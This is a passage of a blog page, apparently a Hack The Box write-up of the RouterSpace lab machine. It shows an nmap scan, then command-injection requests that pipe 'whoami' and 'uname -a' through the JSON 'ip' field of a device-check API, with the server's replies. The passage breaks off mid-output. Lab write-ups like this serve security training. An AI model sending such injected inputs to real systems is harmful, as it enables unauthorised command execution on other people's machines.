@@ -1,0 +1,679 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="HTB Walkthrough - RouterSpace Recon 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - RouterSpace">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-RouterSpace.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="HTB Walkthrough - RouterSpace Recon 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607133628875.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.036Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.032Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607133628875.png">
+  
+  
+  
+  <title>HTB Walkthrough - RouterSpace - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - RouterSpace"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          89 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - RouterSpace</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>HTB Walkthrough - RouterSpace</p>
+<p>Recon</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.92SVN scan initiated Tue Jun  7 14:26:06 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt -T4 10.10.11.148</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.148</span><br><span class="line">Host is up (0.20s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     (protocol 2.0)</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|_    SSH-2.0-RouterSpace Packet Filtering V1</span><br><span class="line">80/tcp open  http</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     X-Powered-By: RouterSpace</span><br><span class="line">|     X-Cdn: RouterSpace-33828</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 66</span><br><span class="line">|     ETag: W/<span class="string">&quot;42-VNKMGPMvv4TCZTLr0VRwPPt5x1g&quot;</span></span><br><span class="line">|     Date: Tue, 07 Jun 2022 06:26:17 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Suspicious activity detected !!! &#123;RequestID: 0 A vdE eM s kV &#125;</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     X-Powered-By: RouterSpace</span><br><span class="line">|     X-Cdn: RouterSpace-87987</span><br><span class="line">|     Accept-Ranges: bytes</span><br><span class="line">|     Cache-Control: public, max-age=0</span><br><span class="line">|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT</span><br><span class="line">|     ETag: W/<span class="string">&quot;652c-17d476c9285&quot;</span></span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     Content-Length: 25900</span><br><span class="line">|     Date: Tue, 07 Jun 2022 06:26:13 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html class=<span class="string">&quot;no-js&quot;</span> lang=<span class="string">&quot;zxx&quot;</span>&gt;</span><br><span class="line">|     &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">|     &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">|     &lt;meta http-equiv=<span class="string">&quot;x-ua-compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">|     &lt;title&gt;RouterSpace&lt;/title&gt;</span><br><span class="line">|     &lt;meta name=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">|     &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">|     &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line">|     &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/owl.carousel.min.css&quot;</span>&gt;</span><br><span class="line">|     &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/magnific-popup.css&quot;</span>&gt;</span><br><span class="line">|     &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/font-awesome.min.css&quot;</span>&gt;</span><br><span class="line">|     &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/themify-icons.css&quot;</span>&gt;</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     X-Powered-By: RouterSpace</span><br><span class="line">|     X-Cdn: RouterSpace-83483</span><br><span class="line">|     Allow: GET,HEAD,POST</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 13</span><br><span class="line">|     ETag: W/<span class="string">&quot;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo&quot;</span></span><br><span class="line">|     Date: Tue, 07 Jun 2022 06:26:14 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     GET,HEAD,POST</span><br><span class="line">|   RTSPRequest, X11Probe: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|_    Connection: close</span><br><span class="line">|_http-title: RouterSpace</span><br><span class="line">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://google.com/cgi-bin/submit.cgi?new-service :</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port22-TCP:V=7.92SVN%I=7%D=6/7%Time=629EEF85%P=x86_64-unknown-linux-gnu</span><br><span class="line">SF:%r(NULL,29,<span class="string">&quot;SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n&quot;</span>);</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port80-TCP:V=7.92SVN%I=7%D=6/7%Time=629EEF85%P=x86_64-unknown-linux-gnu</span><br><span class="line">SF:%r(GetRequest,29F8,<span class="string">&quot;HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSp</span></span><br><span class="line"><span class="string">SF:ace\r\nX-Cdn:\x20RouterSpace-87987\r\nAccept-Ranges:\x20bytes\r\nCache-</span></span><br><span class="line"><span class="string">SF:Control:\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov</span></span><br><span class="line"><span class="string">SF:\x202021\x2011:33:57\x20GMT\r\nETag:\x20W/\&quot;652c-17d476c9285\&quot;\r\nConte</span></span><br><span class="line"><span class="string">SF:nt-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\n</span></span><br><span class="line"><span class="string">SF:Date:\x20Tue,\x2007\x20Jun\x202022\x2006:26:13\x20GMT\r\nConnection:\x2</span></span><br><span class="line"><span class="string">SF:0close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;zx</span></span><br><span class="line"><span class="string">SF:x\&quot;&gt;\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20</span></span><br><span class="line"><span class="string">SF:\x20&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x</span></span><br><span class="line"><span class="string">SF:20\x20\x20\x20&lt;title&gt;RouterSpace&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\x20name</span></span><br><span class="line"><span class="string">SF:=\&quot;description\&quot;\x20content=\&quot;\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;view</span></span><br><span class="line"><span class="string">SF:port\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=1\&quot;&gt;\n\n\x20\x</span></span><br><span class="line"><span class="string">SF:20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/bootstrap\.min\.css</span></span><br><span class="line"><span class="string">SF:\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/owl\.car</span></span><br><span class="line"><span class="string">SF:ousel\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href</span></span><br><span class="line"><span class="string">SF:=\&quot;css/magnific-popup\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;styleshee</span></span><br><span class="line"><span class="string">SF:t\&quot;\x20href=\&quot;css/font-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20r</span></span><br><span class="line"><span class="string">SF:el=\&quot;stylesheet\&quot;\x20href=\&quot;css/themify-icons\.css\&quot;&gt;\n\x20&quot;</span>)%r(HTTPOpt</span><br><span class="line">SF:ions,108,<span class="string">&quot;HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-C</span></span><br><span class="line"><span class="string">SF:dn:\x20RouterSpace-83483\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x2</span></span><br><span class="line"><span class="string">SF:0text/html;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\&quot;d</span></span><br><span class="line"><span class="string">SF:-bMedpZYGrVt1nR4x\+qdNZ2GqyRo\&quot;\r\nDate:\x20Tue,\x2007\x20Jun\x202022\x</span></span><br><span class="line"><span class="string">SF:2006:26:14\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST&quot;</span>)%r(RTSP</span><br><span class="line">SF:Request,2F,<span class="string">&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\</span></span><br><span class="line"><span class="string">SF:r\n\r\n&quot;</span>)%r(X11Probe,2F,<span class="string">&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti</span></span><br><span class="line"><span class="string">SF:on:\x20close\r\n\r\n&quot;</span>)%r(FourOhFourRequest,128,<span class="string">&quot;HTTP/1\.1\x20200\x20OK\</span></span><br><span class="line"><span class="string">SF:r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-33828\r\nConte</span></span><br><span class="line"><span class="string">SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2066\r\nETa</span></span><br><span class="line"><span class="string">SF:g:\x20W/\&quot;42-VNKMGPMvv4TCZTLr0VRwPPt5x1g\&quot;\r\nDate:\x20Tue,\x2007\x20Ju</span></span><br><span class="line"><span class="string">SF:n\x202022\x2006:26:17\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\</span></span><br><span class="line"><span class="string">SF:x20activity\x20detected\x20!!!\x20&#123;RequestID:\x200\x20A\x20\x20vdE\x20e</span></span><br><span class="line"><span class="string">SF:M\x20s\x20kV\x20\x20&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://google.com/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Tue Jun  7 14:26:58 2022 -- 1 IP address (1 host up) scanned in 52.85 seconds</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607133628875.png" srcset="/img/loading.gif" lazyload alt="image-20220607133628875"></p>
+<p>点击按钮能够抓到一个包。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v4/monitoring/router/dev/check/deviceAccess</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">user-agent</span><span class="punctuation">: </span>RouterSpaceAgent</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>16</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>routerspace.htb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span><span class="string">&quot;0.0.0.0&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>目标会返回一个这样的包</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>RouterSpace</span><br><span class="line"><span class="attribute">X-Cdn</span><span class="punctuation">: </span>RouterSpace-4331</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>W/&quot;b-ANdgA/PInoUrpfEatjy5cxfJOCY&quot;</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Tue, 07 Jun 2022 05:44:59 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-lsl"><span class="string">&quot;0.0.0.0<span class="subst">\n</span>&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>RouterSpace</span><br><span class="line"><span class="attribute">X-Cdn</span><span class="punctuation">: </span>RouterSpace-99107</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>16</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>W/&quot;10-BlxNnG9XXox6OkKPYocmDX3rnQE&quot;</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Tue, 07 Jun 2022 05:45:52 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-lsl"><span class="string">&quot;10.10.11.148<span class="subst">\n</span>&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>能够远程检测状态，远程检测肯定要先确定目标IP确实存活，可能会涉及到ping，走ping的话或许会产生命令注入。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v4/monitoring/router/dev/check/deviceAccess</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">user-agent</span><span class="punctuation">: </span>RouterSpaceAgent</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>28</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>routerspace.htb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span><span class="string">&quot;10.10.11.148|whoami&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>RouterSpace</span><br><span class="line"><span class="attribute">X-Cdn</span><span class="punctuation">: </span>RouterSpace-33899</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>W/&quot;8-qTM+b2Uq+FmQphCm7m1RM+pENkU&quot;</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Tue, 07 Jun 2022 05:50:53 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-lsl"><span class="string">&quot;paul<span class="subst">\n</span>&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v4/monitoring/router/dev/check/deviceAccess</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">user-agent</span><span class="punctuation">: </span>RouterSpaceAgent</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>routerspace.htb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span><span class="string">&quot;10.10.11.148|uname -a&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>RouterSpace</span><br><span class="line"><span class="attribute">X-Cdn</span><span class="punctuation">: </span>RouterSpace-73188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>118</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>W/&quot;76-8Wa8VoIuEr6UmcoU3vuaXZww1aE&quot;</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Tue, 07 Jun 2022 05:51:46 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-dns">&quot;Linux routerspace.htb <span class="number">5.4.0-90</span>-generic #<span 